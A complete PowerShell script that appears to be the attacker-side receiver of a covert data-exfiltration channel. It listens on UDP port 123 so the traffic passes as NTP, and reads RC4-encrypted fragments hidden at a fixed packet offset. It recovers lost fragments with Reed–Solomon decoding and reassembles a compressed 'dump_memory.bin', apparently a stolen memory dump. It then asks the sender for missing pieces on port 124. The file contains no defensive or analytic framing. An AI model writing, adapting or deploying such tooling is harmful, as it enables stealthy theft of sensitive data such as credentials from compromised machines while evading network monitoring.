# Global parameters
$BLOCK_SIZE         = 10          # Number of data fragments per RS block
$FRAGMENT_SIZE      = 2           # Each fragment contains 2 useful bytes
$RC4_KEY            = [System.Text.Encoding]::ASCII.GetBytes("MySecretKey")  # Same key as the client
$BASE_TIMEOUT       = 432000      # Global timeout in seconds (5 days)
$SOCKET_RCVBUF_SIZE = 1 -shl 20   # Buffer size

# Logging function
function Write-Log {
    param(
        [string]$Level,
        [string]$Message
    )
    Write-Host "$(Get-Date -Format o) [$Level] $Message"
}

# --- GF(256) initialization for Reed–Solomon ---
$GF_EXP = New-Object int[] 512
$GF_LOG = New-Object int[] 256

function Init-GF {
    $x = 1
    for ($i = 0; $i -lt 255; $i++) {
        $GF_EXP[$i] = $x
        $GF_LOG[$x] = $i
        $x = $x * 2
        if (($x -band 0x100) -ne 0) {
            $x = $x -bxor 0x11d
        }
    }
    for ($i = 255; $i -lt 512; $i++) {
        $GF_EXP[$i] = $GF_EXP[$i - 255]
    }
}

function GF-Mul($a, $b) {
    if (($a -eq 0) -or ($b -eq 0)) { return 0 }
    $index = ($GF_LOG[$a] + $GF_LOG[$b]) % 255
    return $GF_EXP[$index]
}

function GF-Inv($a) {
    if ($a -eq 0) { throw "GF(256) inverse of 0" }
    return $GF_EXP[255 - $GF_LOG[$a]]
}

# --- RC4 functions ---
function RC4-Init($key) {
    $S = 0..255
    $j = 0
    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $S[$i] + $key[$i % $key.Length]) % 256
        $temp  = $S[$i]
        $S[$i] = $S[$j]
        $S[$j] = $temp
    }
    return $S
}

function RC4-Stream($S, $length) {
    $i = 0
    $j = 0
    $stream = @()
    for ($n = 0; $n -lt $length; $n++) {
        $i = ($i + 1) % 256
        $j = ($j + $S[$i]) % 256
        $temp  = $S[$i]
        $S[$i] = $S[$j]
        $S[$j] = $temp
        $index = ($S[$i] + $S[$j]) % 256
        $stream += $S[$index]
    }
    return $stream
}

function RC4-Decrypt($encrypted, $key, $skip) {
    # Decrypt RC4 after skipping $skip bytes of keystream
    $S = RC4-Init $key
    [void](RC4-Stream $S $skip)
    $keystream = RC4-Stream $S $encrypted.Length
    $result = New-Object byte[] ($encrypted.Length)
    for ($i = 0; $i -lt $encrypted.Length; $i++) {
        $result[$i] = $encrypted[$i] -bxor $keystream[$i]
    }
    return $result
}

function Try-Decrypt($encrypted, $key, $skip) {
    # Attempt decryption and extract 32-bit value
    $decrypted = RC4-Decrypt $encrypted $key $skip
    $valBytes = $decrypted[0..3]
    [array]::Reverse($valBytes)
    $val = [BitConverter]::ToUInt32($valBytes, 0)
    return @{ Value = $val; Decrypted = $decrypted }
}

function Deduce-Skip($encrypted, $key, $total_fragments, $is_fec) {
    # Determine the RC4 skip value by testing all possibilities
    for ($skip = 0; $skip -lt 256; $skip++) {
        $result = Try-Decrypt $encrypted $key $skip
        $val = $result.Value
        $seq = $val -shr 16
        if (-not $is_fec) {
            # Data packets: sequence number must be < total_fragments
            if ($seq -lt $total_fragments) {
                return @{ Skip = $skip; Value = $val }
            }
        }
        else {
            # FEC packets: sequence number should be >= total_fragments
            if ($seq -ge $total_fragments) {
                return @{ Skip = $skip; Value = $val }
            }
        }
    }
    return $null
}

# --- RS decoding (Gaussian elimination over GF(256)) ---
function RS-Solve($equations, $k) {
    $n = $equations.Count
    # Build augmented matrix A|b
    $A = @()
    foreach ($eq in $equations) {
        $rowList = $eq.Row.Clone()
        $rowList += $eq.Y
        $A += ,$rowList
    }
    for ($col = 0; $col -lt $k; $col++) {
        $pivot_row = $null
        for ($row = $col; $row -lt $n; $row++) {
            if ($A[$row][$col] -ne 0) {
                $pivot_row = $row
                break
            }
        }
        if ($pivot_row -eq $null) {
            throw "Singular system, not enough independent equations"
        }
        # Swap pivot row
        $temp = $A[$col]
        $A[$col] = $A[$pivot_row]
        $A[$pivot_row] = $temp
        # Normalize pivot row
        $inv_val = GF-Inv $A[$col][$col]
        for ($j = $col; $j -le $k; $j++) {
            $A[$col][$j] = GF-Mul $A[$col][$j] $inv_val
        }
        # Eliminate other rows
        for ($row = 0; $row -lt $n; $row++) {
            if (($row -ne $col) -and ($A[$row][$col] -ne 0)) {
                $factor = $A[$row][$col]
                for ($j = $col; $j -le $k; $j++) {
                    $A[$row][$j] = $A[$row][$j] -bxor (GF-Mul $factor $A[$col][$j])
                }
            }
        }
    }
    # Extract solution
    $solution = @()
    for ($i = 0; $i -lt $k; $i++) {
        $solution += $A[$i][$k]
    }
    return $solution
}

function Build-Equations($block_data, $fec_data, $k_block, $pos) {
    # Build the system of equations for Reed–Solomon decoding
    $equations = @()
    foreach ($i in $block_data.Keys) {
        $row = New-Object int[] ($k_block)
        for ($j = 0; $j -lt $k_block; $j++) { $row[$j] = 0 }
        $row[$i] = 1
        $y = $block_data[$i][$pos]
        $equations += [PSCustomObject]@{ Row = $row; Y = $y }
    }
    foreach ($j in $fec_data.Keys) {
        $row = New-Object int[] ($k_block)
        for ($i = 0; $i -lt $k_block; $i++) {
            $value = $GF_EXP[(($i * ([int]$j + 1)) % 255)]
            $row[$i] = $value
        }
        $y = $fec_data[$j][$pos]
        $equations += [PSCustomObject]@{ Row = $row; Y = $y }
    }
    return $equations
}

function RS-Decode-Block($block_data, $fec_data, $k_block) {
    # Decode one block of up to k_block fragments in two byte positions
    $eq0 = Build-Equations $block_data $fec_data $k_block 0
    if ($eq0.Count -lt $k_block) {
        throw "Not enough equations to solve RS"
    }
    $sol0 = RS-Solve ($eq0[0..($k_block - 1)]) $k_block

    $eq1 = Build-Equations $block_data $fec_data $k_block 1
    $sol1 = RS-Solve ($eq1[0..($k_block - 1)]) $k_block

    $recovered = @{}
    for ($i = 0; $i -lt $k_block; $i++) {
        if (-not $block_data.ContainsKey($i)) {
            $bytePair = [byte[]]@($sol0[$i], $sol1[$i])
            $recovered[$i] = $bytePair
        }
    }
    return $recovered
}

# --- Zlib decompression function ---
function Decompress-Zlib {
    param(
        [byte[]]$data
    )
    $ms = New-Object System.IO.MemoryStream(, $data)
    try {
        $zs = New-Object System.IO.Compression.ZLibStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
    }
    catch {
        $ms.Position = 0
        $zs = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
    }
    $outStream = New-Object System.IO.MemoryStream
    $buffer = New-Object byte[] 4096
    while (($read = $zs.Read($buffer, 0, $buffer.Length)) -gt 0) {
        $outStream.Write($buffer, 0, $read)
    }
    $zs.Close()
    $ms.Close()
    return $outStream.ToArray()
}

# --- Reception and reassembly of the dump ---
function Run-Receiver {
    param(
        [string]$listenHost,
        [int]$port,
        [string]$output_file,
        [int]$base_timeout = 120
    )
    # Create UDP client
    $udpClient = New-Object System.Net.Sockets.UdpClient($port)
    $udpClient.Client.ReceiveTimeout = 5000
    Write-Log "INFO" "Listening on ${listenHost}:${port} ..."

    $header_received = $false
    $total_fragments = 0
    $total_size = 0
    $data_packets = @{}   # Hashtable: global sequence -> byte[2]
    $fec_packets  = @{}   # Hashtable: "block_index_idx" -> byte[2]
    $start_time   = Get-Date
    $sender_addr  = $null

    Write-Log "INFO" "Waiting for header..."
    while ($true) {
        try {
            $remoteEP = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
            $data = $udpClient.Receive([ref] $remoteEP)
        }
        catch {
            if ((New-TimeSpan -Start $start_time).TotalSeconds -gt $base_timeout) {
                Write-Log "WARNING" "Global timeout reached, stopping reception."
                break
            }
            continue
        }

        if (-not $sender_addr) {
            $sender_addr = $remoteEP
        }

        if ($data.Length -lt 48) { continue }

        # Extract the 8-byte payload from offset 40
        $payload = $data[40..47]
        if (-not $header_received) {
            # First payload: header with fragment count and total size
            $fragBytes = $payload[0..3]
            [array]::Reverse($fragBytes)
            $total_fragments = [BitConverter]::ToUInt32($fragBytes, 0)
            $sizeBytes = $payload[4..7]
            [array]::Reverse($sizeBytes)
            $total_size = [BitConverter]::ToUInt32($sizeBytes, 0)
            $header_received = $true
            Write-Log "INFO" "Header received: $total_fragments fragments, $total_size compressed bytes."
            continue
        }

        # For subsequent packets, bytes 4..7 are RC4-encrypted fragment data
        $encrypted = $payload[4..7]
        $result = Deduce-Skip $encrypted $RC4_KEY $total_fragments $false
        if ($result) {
            # Data packet
            $seq  = $result.Value -shr 16
            $fragVal = $result.Value -band 0xFFFF
            $fragBytes = [BitConverter]::GetBytes([UInt16]$fragVal)
            [array]::Reverse($fragBytes)
            $data_packets[$seq] = $fragBytes
            $progress = ($data_packets.Count / $total_fragments) * 100
            Write-Log "INFO" "Progress: $($data_packets.Count)/$total_fragments fragments received ($([Math]::Round($progress,1))%)"
        }
        else {
            # Try FEC packet
            $resultFec = Deduce-Skip $encrypted $RC4_KEY $total_fragments $true
            if ($resultFec) {
                $fec_seq = $resultFec.Value
                $seq_high = $fec_seq -shr 16
                $block_index = [Math]::Floor($seq_high / $BLOCK_SIZE)
                $idx_in_block = $seq_high % $BLOCK_SIZE
                $fragVal = $fec_seq -band 0xFFFF
                $fragBytes = [BitConverter]::GetBytes([UInt16]$fragVal)
                [array]::Reverse($fragBytes)
                $key = "$block_index`_$idx_in_block"
                $fec_packets[$key] = $fragBytes
                Write-Log "INFO" "FEC packet received: block $block_index, index $idx_in_block"
            }
            else {
                Write-Log "WARNING" "Could not deduce skip for a packet; skipping it."
            }
        }

        if ($data_packets.Count -eq $total_fragments) {
            Write-Log "INFO" "All data packets have been received."
            break
        }
    }
    $udpClient.Close()
    Write-Log "INFO" "Reception finished: $($data_packets.Count)/$total_fragments data packets received."

    # Reassemble dump by blocks
    $num_blocks = [Math]::Ceiling($total_fragments / $BLOCK_SIZE)
    $reconstructed = New-Object byte[] ($total_fragments * $FRAGMENT_SIZE)
    Write-Log "INFO" "Reconstructing dump ..."
    $bar_length = 30
    for ($b = 0; $b -lt $num_blocks; $b++) {
        $block_start = $b * $BLOCK_SIZE
        $k_block = [Math]::Min($BLOCK_SIZE, $total_fragments - $block_start)
        $block_data_pos0 = @{}
        $block_data_pos1 = @{}
        for ($i = 0; $i -lt $k_block; $i++) {
            $seq = $block_start + $i
            if ($data_packets.ContainsKey($seq)) {
                $val = $data_packets[$seq]
                $block_data_pos0[$i] = ,$val[0]
                $block_data_pos1[$i] = ,$val[1]
            }
        }
        $block_fec_pos0 = @{}
        $block_fec_pos1 = @{}
        for ($j = 0; $j -lt $BLOCK_SIZE; $j++) {
            $key = "$b`_$j"
            if ($fec_packets.ContainsKey($key)) {
                $val = $fec_packets[$key]
                $block_fec_pos0[$j] = ,$val[0]
                $block_fec_pos1[$j] = ,$val[1]
            }
        }
        if ($block_data_pos0.Count -lt $k_block) {
            try {
                $recovered0 = RS-Decode-Block $block_data_pos0 $block_fec_pos0 $k_block
                $recovered1 = RS-Decode-Block $block_data_pos1 $block_fec_pos1 $k_block
                for ($i = 0; $i -lt $k_block; $i++) {
                    if (-not $block_data_pos0.ContainsKey($i)) {
                        $d0 = $recovered0[$i][0]
                        $d1 = $recovered1[$i][0]
                        $bytePair = [byte[]]@($d0, $d1)
                        $data_packets[$block_start + $i] = $bytePair
                        Write-Log "INFO" "Missing fragment $($block_start + $i) recovered via RS."
                    }
                }
            }
            catch {
                Write-Log "ERROR" "RS decoding failed for block ${b}: $($_)"
            }
        }
        for ($i = 0; $i -lt $k_block; $i++) {
            $seq = $block_start + $i
            if ($data_packets.ContainsKey($seq)) {
                $frag = $data_packets[$seq]
            }
            else {
                $frag = [byte[]]@(0,0)
            }
            $startIndex = $seq * $FRAGMENT_SIZE
            $frag.CopyTo($reconstructed, $startIndex)
        }
        $progress = (($b + 1) / $num_blocks) * 100
        $filled_length = [Math]::Floor($bar_length * ($b + 1) / $num_blocks)
        $bar = ("=" * $filled_length).PadRight($bar_length, "-")
        Write-Host -NoNewline ("`r[Reconstruction] [$bar] {0:5.1f}%" -f $progress)
    }
    Write-Host ""
    
    # Trim to actual compressed size and decompress
    $reconstructed = $reconstructed[0..($total_size - 1)]
    try {
        $dump_data = Decompress-Zlib $reconstructed
        [System.IO.File]::WriteAllBytes($output_file, $dump_data)
        Write-Log "INFO" "Dump decompressed and saved to '$output_file'."
    }
    catch {
        Write-Log "ERROR" "Decompression failed: $($_)"
        $compressed_file = $output_file + ".compressed"
        [System.IO.File]::WriteAllBytes($compressed_file, $reconstructed)
        Write-Log "INFO" "Compressed dump saved to '$compressed_file'."
    }
    
    # Send feedback for any remaining missing fragments
    $missing_fragments = @()
    for ($i = 0; $i -lt $total_fragments; $i++) {
        if (-not $data_packets.ContainsKey($i)) {
            $missing_fragments += $i
        }
    }
    if (($missing_fragments.Count -gt 0) -and $sender_addr) {
        Write-Log "INFO" "Missing fragments after RS: $missing_fragments"
        $feedback = New-Object System.Collections.Generic.List[byte]
        $countBytes = [BitConverter]::GetBytes([UInt32]$missing_fragments.Count)
        [array]::Reverse($countBytes)
        $feedback.AddRange($countBytes)
        foreach ($seq in $missing_fragments) {
            $seqBytes = [BitConverter]::GetBytes([UInt32]$seq)
            [array]::Reverse($seqBytes)
            $feedback.AddRange($seqBytes)
        }
        $feedback_bytes = $feedback.ToArray()
        $feedback_port = 124
        $fbClient = New-Object System.Net.Sockets.UdpClient
        try {
            $fbClient.Send($feedback_bytes, $feedback_bytes.Length, $sender_addr.Address.ToString(), $feedback_port) | Out-Null
            Write-Log "INFO" "Feedback sent to $($sender_addr.Address):${feedback_port}"
        }
        catch {
            Write-Log "ERROR" "Error sending feedback: $($_)"
        }
        finally {
            $fbClient.Close()
        }
    }
}

# --- Main execution ---
Init-GF
$listenHost = "0.0.0.0"  # Listen on all interfaces
$port       = 123        # UDP port (requires privileges on some ports)
$output_file = "dump_memory.bin"

Run-Receiver -listenHost $listenHost -port $port -output_file $output_file -base_timeout $BASE_TIMEOUT
